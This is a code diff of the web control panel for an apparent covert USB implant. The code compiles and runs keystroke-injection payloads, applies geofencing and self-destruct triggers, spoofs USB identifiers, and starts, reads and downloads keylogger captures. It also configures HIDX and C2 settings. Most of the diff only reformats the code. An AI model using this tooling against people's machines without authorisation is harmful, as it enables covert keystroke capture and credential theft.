-			} = parseData(data.toString());
-
+			const { response, parameters } = parseData(data.toString());
+		
 			if (parameters.length === 1) {
 				splitPayload.push(parameters[0]);
 				if (splitPayloadCounter === 15) {
@@ -4242,15 +4168,15 @@ DELAY 2000
 			} else {
 				logMessage(`INFO`, `! THIS PAYLOAD SLOT IS EMPTY`);
 			}
-
+		
 			logMessage(`DEBUG`, `loadPayloadCallback: [data]:[${response}]`);
 			splitPayloadCounter += 1;
 			payloadEditorSavedElement = document.getElementById('payloadEditorSaved');
 			payloadEditorSavedElement.innerHTML = "Saved";
-
+		
 			payloadEditorFilenameValue = document.getElementById(`payloadEditorFilename`).innerHTML;
 			payloadEditorBootable = document.getElementById('payloadEditorBootable');
-
+		
 			if (bootpair == payloadEditorFilenameValue) {
 				payloadEditorBootable.innerHTML = " + bootscript";
 				payloadSaveMenuBootable = document.getElementById(`ayload-runOnBoot`);
@@ -4259,13 +4185,13 @@ DELAY 2000
 				payloadEditorBootable.innerHTML = "";
 			}
 		}
-
+		
 		// Payload Save
 		function payloadSlotSave(slotValue) {
-			if (slotValue == "") {
+			if(slotValue == "") {
 				return;
 			}
-
+			
 			iterations = 0;
 			createDialog({
 				id: 'payloadsaving',
@@ -4273,15 +4199,15 @@ DELAY 2000
 				description: `Please wait...`,
 				closeEnabled: true,
 			});
-
+		
 			let bootpairvalue = document.getElementById("bootscriptPair").value;
 			payloadEditorSavedElement = document.getElementById('payloadEditorSaved');
 			payloadEditorSavedElement.innerHTML = "Saved";
 			const payloadEditor = document.getElementById('payload');
 			const payloadOutput = document.getElementById('payloadoutput');
-
+		
 			payloadOutput.value = payloadOutput;
-
+		
 			const sectorSize = 4096;
 			if (slotValue == "bootscript") {
 				scriptcode = compileDuckyScript();
@@ -4294,16 +4220,16 @@ DELAY 2000
 			const payloadSlotSectors = document.getElementById(slotValue).value;
 			const payloadSlotSize = payloadSlotSectors * sectorSize;
 			const payloadSlotAddress = payloadSlotBlocks * sectorSize;
-
+		
 			let totalLength = scriptcode.reduce((accumulator, currentValue) => {
 				return accumulator + currentValue.toString().length;
 			}, 0);
-
+		
 			if (totalLength > payloadSlotSize) {
 				logMessage(`INFO`, `? PAYLOAD LENGTH TOO LONG: [${totalLength} bytes of ${payloadSlotSize} bytes.`);
 				return;
 			}
-
+		
 			if (slotValue !== "bootscript") {
 				for (let i = 0; i < payloadSlotSectors; i++) {
 					sendMessage(`FE${String(parseInt(payloadSlotBlocks) + i)}`);
@@ -4314,9 +4240,9 @@ DELAY 2000
 					sendMessage(`FE${String(parseInt(payloadSlotBlocks) + i)}`);
 				}
 			}
-
+		
 			iterations = Math.ceil(totalLength / writeSize);
-			if (slotValue == "bootscript") {
+			if(slotValue == "bootscript") {
 				scriptcode.forEach(payload => {
 					cmd = `[pS-bootscript]CEStore\tbootscript\t${payload}`;
 					sendMessage(cmd);
@@ -4335,12 +4261,12 @@ DELAY 2000
 					}
 				});
 			}
-
+		
 			logMessage(`INFO`, `! SAVED USER PAYLOAD TO SLOT ${slotValue}`, `Payload Saved to ${slotValue}.`);
 			payloadEditorFilename = document.getElementById(`payloadEditorFilename`);
 			payloadEditorFilename.innerHTML = slotValue;
 			payloadEditorBootable = document.getElementById('payloadEditorBootable');
-
+		
 			if (bootpair == slotValue) {
 				payloadSlotSave("bootscript");
 				payloadEditorFilename.innerHTML = bootpairvalue;
@@ -4349,54 +4275,62 @@ DELAY 2000
 				payloadEditorBootable.innerHTML = "";
 			}
 		}
-
+		
 		let slotSaveTimeoutId = null;
-
+		
 		function apiResponsePayloadSave(data) {
 			logMessage(`CRIT`, `apiResponsePayloadSave: ${typeof data}`);
 			logMessage(`WARN`, `Writing Payload to Slot - ${splitPayloadCounter + 1} of ${iterations}`, `Payload Saved to Slot.`);
-
+		
 			if (slotSaveTimeoutId !== null) {
 				clearTimeout(slotSaveTimeoutId);
 			}
-
+		
 			slotSaveTimeoutId = setTimeout(() => {
 				viewDialog('payloadsaving', 'remove');
 			}, 4000);
-
+		
 			splitPayloadCounter += 1;
-
+		
 			if (splitPayloadCounter == iterations) {
 				viewDialog('payloadsaving', 'remove');
 				clearTimeout(slotSaveTimeoutId);
+			} else {
+				viewDialog('payloadsaving', 'remove');
+				createDialog({
+					id: 'payloadsaving',
+					title: 'Saving Payload',
+					description: `Saving Failed. Please Retry.`,
+					closeEnabled: true,
+				});
 			}
 		}
-
+		
 		// Payload Run
 		function payloadRun() {
 			const footerNavPayloadRun = document.getElementById("footerNavPayloadRun");
 			scriptcode = ``;
 			scriptcode = compileDuckyScript();
-
+		
 			let counter = 0;
 			scriptcode.forEach(payload => {
 				let command_line = counter === 0 ? `CE[${crc16}]${payload}` : `CE[${crc16}]${payload}`;
 				counter++;
-
+		
 				if (!payload) {
 					footerNavPayloadRun.classList.remove("buttonRunning");
 					logMessage("INFO", "? SCRIPT SYNTAX IS INVALID");
 					return;
 				}
-
+		
 				sendMessage(command_line);
 				logMessage(`CRIT`, `Queueing Payload Segment: [cmd]:[${command_line}]`);
 			});
-
+		
 			logMessage(`INFO`, `Payload Running`);
 			sendMessage("CEStatus");
 		}
-
+		
 		const validateAndLogError = (value, cmd, lengthRange, errorMsg) => {
 			if (value && (value.length < lengthRange[0] || value.length > lengthRange[1])) {
 				logMessage('INFO', `! ALERT: Payload Compile Failed. ${cmd} ${errorMsg}`);
@@ -4404,30 +4338,14 @@ DELAY 2000
 			}
 			return true;
 		};
-
+		
 		const commandConfigs = {
-			"IF_PRESENT": {
-				prefixSSID: "24",
-				prefixBSSID: "25",
-				cmdFooter: "0307"
-			},
-			"IF_NOTPRESENT": {
-				prefixSSID: "26",
-				prefixBSSID: "27",
-				cmdFooter: "0307"
-			},
-			"WAIT_FOR_PRESENT": {
-				prefixSSID: "28",
-				prefixBSSID: "29",
-				cmdFooter: "0407"
-			},
-			"WAIT_FOR_NOTPRESENT": {
-				prefixSSID: "2A",
-				prefixBSSID: "2B",
-				cmdFooter: "0407"
-			}
+			"IF_PRESENT": { prefixSSID: "24", prefixBSSID: "25", cmdFooter: "0307" },
+			"IF_NOTPRESENT": { prefixSSID: "26", prefixBSSID: "27", cmdFooter: "0307" },
+			"WAIT_FOR_PRESENT": { prefixSSID: "28", prefixBSSID: "29", cmdFooter: "0407" },
+			"WAIT_FOR_NOTPRESENT": { prefixSSID: "2A", prefixBSSID: "2B", cmdFooter: "0407" }
 		};
-
+		
 		const commandPrefixes = {
 			"VID": "0E",
 			"PID": "0F",
@@ -4438,56 +4356,56 @@ DELAY 2000
 			"JIGGLER": "11",
 			"HIDX": "32"
 		};
-
+		
 		function handleGeofencingCommands(cmd, args) {
 			const config = commandConfigs[cmd];
 			if (!config || !args) {
 				logMessage('INFO', `! ALERT: Payload Compile Failed. ${cmd} requires one of the following: SSID and BSSID.`);
 				return;
 			}
-
+		
 			const argSSID = extractArg(args, /SSID=['"]([^'"]*)['"]/);
 			const argBSSID = extractArg(args, /BSSID=['"]([^'"]*)['"]/);
 			const argSIGNAL = extractArg(args, /SIGNAL=['"]([^'"]*)['"]/);
 			const argMINUTES = extractArg(args, /MINUTES=['"]([^'"]*)['"]/);
 			const argINTERVAL = extractArg(args, /INTERVAL=['"]([^'"]*)['"]/);
-
+		
 			logMessage('CRIT', `geofencing: [cmd]:[${cmd}] [${args}] [ssid]:[${argSSID}] [bssid]:[${argBSSID}] [signal]:[${argSIGNAL}] [minutes]:[${argMINUTES}] [interval]:[${argINTERVAL}]`);
-
+		
 			if (argSSID && argBSSID) {
 				logMessage('INFO', `! ALERT: Payload Compile Failed. ${cmd} does not support both SSID and BSSID.`);
 				return;
 			}
-
+		
 			if (argSSID || argBSSID) {
 				const cmdPrefix = argSSID ? config.prefixSSID : config.prefixBSSID;
 				const argToUse = argSSID || argBSSID;
-
+		
 				if (argBSSID && !validateAndLogError(argBSSID, cmd, [17, 17], `BSSID IS THE WRONG LENGTH. Example: AA:BB:CC:DD:EE:FF vs ${argBSSID}`)) return;
-
+		
 				let cmdData = "";
 				for (let i = 0; i < argToUse.length; i++) {
 					cmdData += (argToUse[i].length % 2 !== 0) ? `${cmdPrefix}${asciiToHex(argToUse[i])}00` : `${cmdPrefix}${asciiToHex(argToUse[i])}`;
 				}
-
+		
 				if (!validateAndLogError(argSIGNAL, cmd, [2, 3], `SIGNAL is invalid. Must be a number between 0 and 99`)) return;
 				const cmdSignal = argSIGNAL ? `${cmdPrefix}02${toHex(argSIGNAL)}` : '';
-
+		
 				if (!validateAndLogError(argMINUTES, cmd, [2, 3], `MINUTES is invalid. Must be a number between 0 and 60`)) return;
 				const cmdMinutes = argMINUTES ? `${cmdPrefix}02${toHex(argMINUTES)}` : `${cmdPrefix}0203`;
-
+		
 				if (!validateAndLogError(argINTERVAL, cmd, [2, 4], `INTERVAL is invalid. Must be a number between 0 and 255`)) return;
 				const cmdInterval = argINTERVAL ? `${cmdPrefix}03${toHex(argINTERVAL)}` : `${cmdPrefix}0300`;
-
+		
 				const cmdArguments = (cmd === "IF_PRESENT" || cmd === "IF_NOTPRESENT") ? cmdSignal : `${cmdMinutes}${cmdInterval}`;
-
+		
 				payloadIntermediate = `${cmdPrefix}0106${cmdData}${cmdArguments}${cmdPrefix}${config.cmdFooter}`;
 			} else {
 				logMessage('INFO', `! ALERT: Payload Compile Failed. ${cmd} requires one of the following: SSID and BSSID.`);
 			}
 			return payloadIntermediate;
 		}
-
+		
 		function handleVidPidCommands(cmd, args, random = false) {
 			payloadIntermediate = "";
 			let prefix = commandPrefixes[cmd];
@@ -4501,7 +4419,7 @@ DELAY 2000
 			}
 			return payloadIntermediate;
 		}
-
+		
 		function handleManProSerCommands(cmd, args, random = false) {
 			let prefix = commandPrefixes[cmd];
 			if (!prefix) {
@@ -4529,7 +4447,7 @@ DELAY 2000
 			payloadIntermediate = payloadParts.join('');
 			return payloadIntermediate;
 		}
-
+		
 		function handleKeyloggerCommands(args) {
 			payloadIntermediate = "";
 			if (args[0] != undefined) {
@@ -4545,7 +4463,7 @@ DELAY 2000
 			}
 			return payloadIntermediate;
 		}
-
+		
 		function handleUsbJigglerCommands(cmd, args) {
 			payloadIntermediate = "";
 			let prefix = commandPrefixes[cmd];
@@ -4553,7 +4471,7 @@ DELAY 2000
 				console.error(`Invalid command: ${cmd}`);
 				return;
 			}
-
+		
 			switch (args[0].toUpperCase()) {
 				case 'ON':
 				case '1':
@@ -4569,7 +4487,7 @@ DELAY 2000
 			}
 			return payloadIntermediate;
 		}
-
+		
 		function handleMouseCommands(args) {
 			payloadIntermediate = "";
 			const command = args[0].toUpperCase();
@@ -4578,13 +4496,13 @@ DELAY 2000
 				"1": "03",
 				"0": "03"
 			};
-
+		
 			payloadIntermediate = "";
-
+		
 			function toHex(value) {
 				return value.toString(16).padStart(2, '0');
 			}
-
+		
 			function updatePayload(x, y) {
 				let isNegativeX = x < 0;
 				let isNegativeY = y < 0;
@@ -4611,7 +4529,7 @@ DELAY 2000
 				payloadIntermediate += `${prefixX}${toHex(Math.abs(x))}00`;
 				payloadIntermediate += `${prefixY}00${toHex(Math.abs(y))}`;
 			}
-
+		
 			if (command === 'MOVE') {
 				let x = parseInt(args[1]);
 				let y = parseInt(args[2]);
@@ -4626,10 +4544,10 @@ DELAY 2000
 			}
 			return payloadIntermediate;
 		}
-
+		
 		function handleSelfDestructCommands(args) {
 			payloadIntermediate = "";
-
+		
 			if (args == "") {
 				args = 1;
 			}
@@ -4649,26 +4567,26 @@ DELAY 2000
 			}
 			return payloadIntermediate;
 		}
-
+		
 		function handleDelayCommands(args) {
 			payloadIntermediate = "";
 			let iDelay = parseInt(args[0]) / 10;
-
+		
 			if (Number.isNaN(iDelay)) {
 				logMessage('INFO', `ERROR: DELAY VALUE IS NOT AN INTEGER`);
 				bRunPayload = false;
 				return;
 			}
-
+		
 			while (iDelay > 65535) {
 				payloadIntermediate += `1DFFFF`;
 				iDelay -= 65535;
 			}
-
+		
 			payloadIntermediate += `1D${toHex(iDelay, 4)}`;
 			return payloadIntermediate;
 		}
-
+		
 		function handleDuckyLangCommands(args) {
 			const lang = args[0];
 			if (keymapList.includes(lang.toUpperCase())) {
@@ -4678,32 +4596,32 @@ DELAY 2000
 				logMessage(`INFO`, `WARNING: DUCKY_LANG ${args} is not one of ${keymapListPretty}. Defaulting to US`);
 			}
 		}
-
+		
 		function handleDefaultDelayCommands(args) {
 			defaultDelay = args[0];
 			logMessage(`INFO`, `DEFAULT_DELAY is set to: ${defaultDelay} ms`);
 		}
-
+		
 		function handleDefaultDelayJitterCommands(args) {
 			defaultDelayJitter = args[0];
 			logMessage(`INFO`, `DEFAULT_DELAY_JITTER is set to: ${defaultDelayJitter} ms`);
 		}
-
+		
 		function handleDefaultCharDelayCommands(args) {
 			defaultCharDelay = args[0];
 			logMessage(`INFO`, `DEFAULT_DELAY is set to: ${defaultCharDelay} ms`);
 		}
-
+		
 		function handleDefaultCharDelayJitterCommands(args) {
 			defaultCharDelayJitter = args[0];
 			logMessage(`INFO`, `DEFAULT_DELAY_JITTER is set to: ${defaultCharDelayJitter} ms`);
 		}
-
+		
 		function handleNamedKeyCombinationCommands(cmd, args) {
 			payloadIntermediate = "";
 			let iModify = 0;
 			let words = cmd.split(/[-+]/).concat(args);
-
+		
 			while (words.length > 0) {
 				if (modifiers[words[0].toUpperCase()] != undefined) {
 					iModify |= modifiers[words[0].toUpperCase()];
@@ -4712,7 +4630,7 @@ DELAY 2000
 					break;
 				}
 			}
-
+		
 			if (words.length == 0) {
 				payloadIntermediate += `01${toHex(iModify)}00`;
 			} else if (words.length == 1 && keyToHidMapping(words[0]) != undefined) {
@@ -4725,7 +4643,7 @@ DELAY 2000
 			}
 			return payloadIntermediate;
 		}
-
+		
 		function generateRandomHex(length) {
 			let result = "";
 			const characters = '0123456789ABCDEF';
@@ -4734,7 +4652,7 @@ DELAY 2000
 			}
 			return result;
 		}
-
+		
 		function generateRandomWords() {
 			const wordCount = Math.floor(Math.random() * 4) + 2;
 			let randomWords = [];
@@ -4754,7 +4672,7 @@ DELAY 2000
 			const suffix = suffixes[Math.floor(Math.random() * suffixes.length)];
 			return randomWords.join(' ') + suffix;
 		}
-
+		
 		function handleRandomCommands(cmd) {
 			payloadIntermediate = "";
 			const commandToCharactersMap = {
@@ -4765,16 +4683,16 @@ DELAY 2000
 				RANDOM_SPECIAL: '!@#$%^&*()',
 				RANDOM_CHAR: 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()',
 			};
-
+		
 			const randomCharacters = commandToCharactersMap[cmd];
-
+		
 			if (randomCharacters) {
 				const selected = randomCharacters.charAt(Math.floor(Math.random() * randomCharacters.length));
 				payloadIntermediate += `${ceBuildPayload(selected)}`;
 			}
 			return payloadIntermediate;
 		}
-
+		
 		// Keylog Module
 		const ELEMENT_IDS = {
 			KEYLOGGER_SPACE_USED: 'keylogger-SpaceUsed',
@@ -4800,22 +4718,22 @@ DELAY 2000
 			RESPONSE_CL_READ: 'response-CLRead',
 			RESPONSE_CL_START: 'response-CLStart',
 		};
-
+		
 		previousData = '';
 		let elements = {};
-
+		
 		for (const key in ELEMENT_IDS) {
 			elements[key] = document.getElementById(ELEMENT_IDS[key]);
 		}
-
+		
 		function convertUint8ArrayToString(data) {
 			return String.fromCharCode.apply(null, new Uint8Array(data));
 		}
-
+		
 		function splitResponseIntoParameters(response) {
 			return response.split("\t");
 		}
-
+		
 		function setElementValue(id, value) {
 			if (elements[id]) {
 				if (elements[id].tagName.toLowerCase() === 'input') {
@@ -4825,7 +4743,7 @@ DELAY 2000
 				}
 			}
 		}
-
+		
 		function updateKeylogStatus(keylogValues) {
 			const spaceUsedDecimal = parseInt(keylogValues[ELEMENT_IDS.KEYLOGGER_SPACE_USED], 16);
 			const spaceFreeDecimal = parseInt(keylogValues[ELEMENT_IDS.KEYLOGGER_SPACE_FREE], 16);
@@ -4836,21 +4754,20 @@ DELAY 2000
 			document.getElementById('keylogStorageUsedBar').style.width = keylogStoragePercent;
 			document.getElementById('keylogStoragePercent').innerHTML = keylogStoragePercent;
 		}
-
+		
 		let prevDataCLStatus = null;
-
 		function apiResponseCLStatus(data) {
 			if (data === prevDataCLStatus) {
 				return;
 			}
 			prevDataCLStatus = data;
-
+		
 			let splitData = data.split('\t');
 			let listName = splitData[0];
 			let jsonData = splitData[1];
 			let jsonObject = JSON.parse(jsonData);
 			let keylogValues = {};
-
+			
 			for (let key in jsonObject) {
 				if (key === "status") {
 					keylogValues['keylogger-Status'] = jsonObject[key];
@@ -4899,42 +4816,55 @@ DELAY 2000
 					}
 				}
 			}
-
+			
 			for (const [elementId, value] of Object.entries(keylogValues)) {
 				const element = document.getElementById(elementId);
 				if (element) element.value = element.innerHTML = value;
 			}
-
+		
 			const spaceUsedDecimal = parseInt(keylogValues['keylogger-SpaceUsed'], 16);
 			const spaceFreeDecimal = parseInt(keylogValues['keylogger-SpaceFree'], 16);
 			const keylogStoragePercent = ((spaceUsedDecimal / spaceFreeDecimal) * 100).toFixed(0) + '%';
 			toggleClassBasedOnStatus('keylogStatusLight', 'statusLightActive', keylogValues['keylogger-Status'], "01");
 			document.getElementById('keylogStorageUsedBar').style.width = keylogStoragePercent;
 			document.getElementById('keylogStoragePercent').innerHTML = keylogStoragePercent;
-
+		
 			logMessage('CRIT', `apiResponseCLStatus: [status]:[${keylogValues['keylogger-Status']}] [captureMode]:[${keylogValues['keylogger-CaptureMode']}] [spaceUsed]:[${keylogValues['keylogger-SpaceUsed']}] [spaceFree]:[${keylogValues['keylogger-SpaceFree']}] [dataWaiting]:[${keylogValues['keylogger-DataWaiting']}] [dataLost]:[${keylogValues['keylogger-DataLost']}] [lastReportID]:[${keylogValues['keylogger-LastReportID']}] [nextReportID]:[${keylogValues['keylogger-NextReportID']}] [usbPkts]:[${keylogValues['keylogger-USBPkts']}] [usbLost]:[${keylogValues['keylogger-USBLost']}] [usbHolds]:[${keylogValues['keylogger-USBHolds']}] [usbBursts]:[${keylogValues['keylogger-USBBursts']}]`);
-
+		
 			updateKeylogStatus(keylogValues);
 		}
-
+		
 		function apiResponseCLStop(data) {
 			setElementValue(ELEMENT_IDS.RESPONSE_CL_STOP, 'buttonSelected');
 			sendMessage("CLStatus");
 		}
-
+		
 		function apiResponseCLStart(data) {
 			setElementValue(ELEMENT_IDS.RESPONSE_CL_START, 'buttonSelected');
 			sendMessage("CLStatus");
 		}
-
+		
 		function apiResponse(data) {
 			let response = convertUint8ArrayToString(data);
 			let parameters = splitResponseIntoParameters(response);
 			let cmd = parameters[0];
-			logMessage(cmd.includes("Error") ? `INFO` : `CRIT`, `apiResponse${cmd}: [data]:[${response}]`);
+		
+			// Check if the response contains 'CEError' anywhere in the string
+			if (data.includes('CEError')) {
+				logMessage(`INFO`, `Payload Halted: CRC Validation Error, please retry.`);
+				setTimeout(() => {
+					sendMessage("CE[19F6]2001011D0000300101");
+				}, 1000);
+			}
+		
+			logMessage(
+				cmd.includes("Error") ? `INFO` : `CRIT`,
+				`apiResponse${cmd}: [data]:[${response}]`
+			);
+			
 			setElementValue(`response-${cmd}`, response);
 		}
-
+		
 		function apiRequestCLRead(data, hex) {
 			responseTextParams = data.split("\t");
 			let clReadTemp = "";
@@ -4956,7 +4886,7 @@ DELAY 2000
 			logMessage(`CRIT`, `CLRead Handler: [${data}] [${responseTextParams[5]}] [${clReadTemp}]`)
 			apiResponseCLRead(data);
 		}
-
+		
 		function apiResponseCLRead(data) {
 			let parameter2 = "";
 			for (let i = 0; i < data.length; i++) {
@@ -4967,14 +4897,14 @@ DELAY 2000
 			output.value = `${parameter2}`;
 			logMessage(`DEBUG`, `apiResponseCLRead: [data]:[${response}] [data]:[${parameter2}]`);
 		}
-
+		
 		function keylogStartStop(mode) {
 			const footerNavKeylogStatus = document.getElementById('footerNavKeylogStatus');
-
+		
 			if (!mode) {
 				mode = footerNavKeylogStatus.classList.contains('buttonSelected') ? 'off' : 'on';
 			}
-
+		
 			if (keylogStatus == '1' || mode == 'off') {
 				footerNavKeylogStatus.classList.remove('buttonSelected');
 				const output = document.getElementById('keylogStartButton');
@@ -4987,71 +4917,60 @@ DELAY 2000
 				sendMessage('CLStart\tk');
 			}
 		}
-
+		
 		let intervalId = null;
-
+		
 		function liveLog(mode) {
 			liveLogStatus = document.getElementById('keylogger-LiveLogStatus').value;
-
+		
 			if (!mode) {
 				mode = liveLogStatus == 'on' ? 'off' : 'on';
 			}
-
+		
 			const output = document.getElementById('keylogger-LiveLogStatus');
 			const footerNavKeylogLiveStatus = document.getElementById('footerNavKeylogLiveStatus');
-
+		
 			if (mode == "on") {
 				output.value = 'on';
 				footerNavKeylogLiveStatus.classList.add('buttonSelected');
-
+		
 				intervalId = setInterval(function() {
 					sendMessage('CLRead\t300');
 				}, 2000);
-
+		
 			} else if (mode == "off") {
 				output.value = 'off';
 				footerNavKeylogLiveStatus.classList.remove('buttonSelected');
-
+		
 				if (intervalId) {
 					clearInterval(intervalId);
 					intervalId = null;
 				}
 			}
 		}
-
+		
 		function keylogToPayloadConverter() {
 			const keylogElement = document.getElementById("keylog");
 			const payloadElement = document.getElementById("payload");
 			const inputCache = keylogElement.value;
 			let keylog = keylogElement.value;
-
-			const regexes = [{
-					pattern: /\[((LEFT|RIGHT)-(CTRL|ALT|GUI))\](.)\[\/((LEFT|RIGHT)-(CTRL|ALT|GUI))\]/g,
-					replaceWith: '$3 $4\r\n'
-				},
-				{
-					pattern: /\[((LEFT|RIGHT)-(SHIFT))\](.)\[\/((LEFT|RIGHT)-(SHIFT))\]/g,
-					replaceWith: '$4'
-				},
-				{
-					pattern: /\[(F[0-9]*|MEDIA*|KPAD*|INT*|LANG*|VOLUME*|AGAIN|ALTERASE|BACKSPACE|CANCEL|CAPSLOCK|CLEAR|COPILOT|COMPOSE|COPY|CRSEL|CUT|DELETE|DOWNARROW|END|ENTER|ESC|EXSEL|FIND|FRONT|HANGEUL|HANJA|HELP|HENKAN|HIRAGANA|HOME|INSERT|KATAKANA|KATAKANAHIRAGANA|KPAD_COMMA|KPAD_EQUAL|KPEQUAL|KPJPCOMMA|LEFTARROW|LOCKING_CAPSLOCK|LOCKING_NUMLOCK|LOCKING_SCROLLLOCK|MUHENKAN|MUTE|NUMLOCK|OPEN|OPER|OUT|PAGEDOWN|PAGEUP|PASTE|PAUSE|POWER|PRINTSCREEN|PRIOR|PROPS|RETURN|RIGHTARROW|RO|SCROLLLOCK|SEPARATOR|STOP|SYSREQ|TAB|UNDO|UPARROW|VOLUMEDOWN|VOLUMEUP|YEN|ZENKAKUHANKAKU)\]/g,
-					replaceWith: '\r\n$1\r\n'
-				}
+		
+			const regexes = [
+				{ pattern: /\[((LEFT|RIGHT)-(CTRL|ALT|GUI))\](.)\[\/((LEFT|RIGHT)-(CTRL|ALT|GUI))\]/g, replaceWith: '$3 $4\r\n' },
+				{ pattern: /\[((LEFT|RIGHT)-(SHIFT))\](.)\[\/((LEFT|RIGHT)-(SHIFT))\]/g, replaceWith: '$4' },
+				{ pattern: /\[(F[0-9]*|MEDIA*|KPAD*|INT*|LANG*|VOLUME*|AGAIN|ALTERASE|BACKSPACE|CANCEL|CAPSLOCK|CLEAR|COPILOT|COMPOSE|COPY|CRSEL|CUT|DELETE|DOWNARROW|END|ENTER|ESC|EXSEL|FIND|FRONT|HANGEUL|HANJA|HELP|HENKAN|HIRAGANA|HOME|INSERT|KATAKANA|KATAKANAHIRAGANA|KPAD_COMMA|KPAD_EQUAL|KPEQUAL|KPJPCOMMA|LEFTARROW|LOCKING_CAPSLOCK|LOCKING_NUMLOCK|LOCKING_SCROLLLOCK|MUHENKAN|MUTE|NUMLOCK|OPEN|OPER|OUT|PAGEDOWN|PAGEUP|PASTE|PAUSE|POWER|PRINTSCREEN|PRIOR|PROPS|RETURN|RIGHTARROW|RO|SCROLLLOCK|SEPARATOR|STOP|SYSREQ|TAB|UNDO|UPARROW|VOLUMEDOWN|VOLUMEUP|YEN|ZENKAKUHANKAKU)\]/g, replaceWith: '\r\n$1\r\n' }
 			];
-
-			regexes.forEach(({
-				pattern,
-				replaceWith
-			}) => {
+		
+			regexes.forEach(({ pattern, replaceWith }) => {
 				keylog = keylog.replace(pattern, replaceWith);
 			});
-
+		
 			logMessage('CRIT', `keylogToPayload: [input]:[${inputCache}] [keylog]:[${keylog}]`);
-
+		
 			payloadElement.value = keylog;
 			contentAreaToggle('payload');
 		}
-
+		
 		const keylogDecoderCache = {};
 		const keylogDecoder = (() => {
 			let cache = {};
@@ -5060,25 +4979,22 @@ DELAY 2000
 					appendAndLogKey(cache[data], data);
 					return cache[data];
 				}
-
+				
 				const mod = data.substr(0, 2);
 				const hid = data.substr(2, 2);
 				if (hid === "00") {
 					return;
 				}
-
+		
 				const binaryMod = parseInt(mod, 16);
-				const {
-					layer,
-					hasOtherModifiers
-				} = determineLayer(binaryMod);
+				const { layer, hasOtherModifiers } = determineLayer(binaryMod);
 				const modifierText = buildModifierText(mod);
 				const key = getKeyFromHID(hid, layer);
-
+		
 				if (key === "NOKEY") {
-					return;
+					return; 
 				}
-
+		
 				let finalKey = key;
 				if (modifierText !== "" && hasOtherModifiers) {
 					console.log(`I have other modifiers! [${mod}]:[${modifierText}]`);
@@ -5090,22 +5006,22 @@ DELAY 2000
 						finalKey = `[${finalKey}]`;
 					}
 				}
-
+		
 				cache[data] = finalKey;
 				appendAndLogKey(finalKey, data);
-
+				
 				memoizedFunction.invalidateCache = () => {
 					cache = {};
 				};
-
+		
 				return finalKey;
 			};
-
+		
 			const determineLayer = (binaryMod) => {
 				const hasShiftModifiers = (binaryMod & 0x02) !== 0 || (binaryMod & 0x20) !== 0;
 				const hasAltGrModifiers = (binaryMod & 0x40) !== 0 || (binaryMod & 0x04) !== 0;
 				const hasOtherModifiers = binaryMod & ~(0x02 | 0x20 | 0x40 | 0x04);
-
+			
 				let layer = 0;
 				if (hasAltGrModifiers && hasShiftModifiers) {
 					layer = 3;
@@ -5114,40 +5030,36 @@ DELAY 2000
 				} else if (hasShiftModifiers) {
 					layer = 1;
 				}
-
-				return {
-					layer,
-					hasOtherModifiers: !!hasOtherModifiers
-				};
+			
+				return { layer, hasOtherModifiers: !!hasOtherModifiers };
 			};
-
+		
 			memoizedFunction.invalidateCache = () => {
 				cache = {};
 			};
-
+		
 			return memoizedFunction;
 		})();
-
+		
 		function appendAndLogKey(finalKey, data) {
 			if (finalKey) {
 				document.getElementById("keylog").append(finalKey);
 				logMessage('DEBUG', `keylogDecoder: [data]:[${data}] [finalKey]:[${finalKey}]`);
 			}
 		}
-
+		
 		function keylogOptionsMenu() {
 			toggleModule('keylogOptionsMenu');
 		}
-
+		
 		var responseHexData;
-
 		function downloadKeylog(responseText, responseHex) {
 			let data = responseText.split("\t")
 			let keylogData = null;
 			if (data == "1") {
 				next = "1";
 				logMessage(`CRIT`, `downloadKeylog Started`);
-			} else if (!Array.isArray(data)) {
+			} else if (!Array.isArray(data)){
 				logMessage(`CRIT`, `downloadKeylog Failed to Get valid Data`);
 			} else {
 				next = data[3];
@@ -5192,15 +5104,12 @@ DELAY 2000
 				}
 			}
 		}
-
+		
 		// HIDX Module
 		function apiResponseCHStart(data) {
-			const {
-				response,
-				parameters
-			} = parseData(data);
+			const { response, parameters } = parseData(data);
 			logMessage(`CRIT`, `CHStart: [data]:[${response}]`);
-
+		
 			if (CHStatus === 1) {
 				document.getElementById(`hidxstatusfile`).classList.remove('active');
 				document.getElementById(`hidxstatustcp`).classList.add('active');
@@ -5212,22 +5121,19 @@ DELAY 2000
 				document.getElementById(`hidxstatustcp`).classList.remove('active');
 			}
 		}
-
+		
 		function apiResponseCHStatus(data) {
-			const {
-				response,
-				parameters
-			} = parseData(data);
+			const { response, parameters } = parseData(data);
 			logMessage(`CRIT`, `CHStatus: [data]:[${response}]`);
-
+		
 			const regex = /CH Mode: (\d+)/;
 			const match = response.match(regex);
-
+		
 			let CHStatus;
 			if (match) {
 				CHStatus = parseInt(match[1], 10);
 			}
-
+		
 			if (CHStatus === 1) {
 				document.getElementById(`hidxstatusfile`).classList.remove('active');
 				document.getElementById(`hidxstatustcp`).classList.add('active');
@@ -5239,7 +5145,7 @@ DELAY 2000
 				document.getElementById(`hidxstatustcp`).classList.remove('active');
 			}
 		}
-
+		
 		function updateHIDXSettings() {
 			cmd = `CTSet\thidxhost\t${document.getElementById("hidxhost").value}`;
 			sendMessage(cmd);
@@ -5252,62 +5158,53 @@ DELAY 2000
 			}
 			sendMessage(cmd);
 		}
-
+		
 		// C2 Module
 		function updateC2Settings() {
 			cmd = `C2Config\t${document.getElementById("c2config").value}`;
 			sendMessage(cmd);
 		}
-
+		
 		function apiResponseC2Config(data) {
-			const {
-				response,
-				parameters
-			} = parseData(data);
-
+			const { response, parameters } = parseData(data);
+		
 			logMessage(`CRIT`, `apiResponseC2Config: [data]:[${data}]`);
 			output = document.getElementById(`response-C2Config`);
 			output.value = data;
-
+		
 			document.getElementById(`c2configApplied`).innerHTML = parameters[1];
 			sendMessage(`CTSet\tc2boot\t1`);
 		}
-
+		
 		let prevDataC2Info = null;
-
+		
 		function apiResponseC2Info(data) {
 			if (data === prevDataC2Info) {
 				return;
 			}
 			prevDataC2Info = data;
-
-			const {
-				response,
-				parameters
-			} = parseData(data);
-
+		
+			const { response, parameters } = parseData(data);
+		
 			logMessage(`CRIT`, `apiResponseC2Info: [data]:[${data}]`);
 			output = document.getElementById(`response-C2Info`);
 			output.value = data;
 		}
-
+		
 		let prevDataC2Status = null;
-
+		
 		function apiResponseC2Status(data) {
 			if (data === prevDataC2Status) {
 				return;
 			}
 			prevDataC2Status = data;
-
-			const {
-				response,
-				parameters
-			} = parseData(data);
-
+		
+			const { response, parameters } = parseData(data);
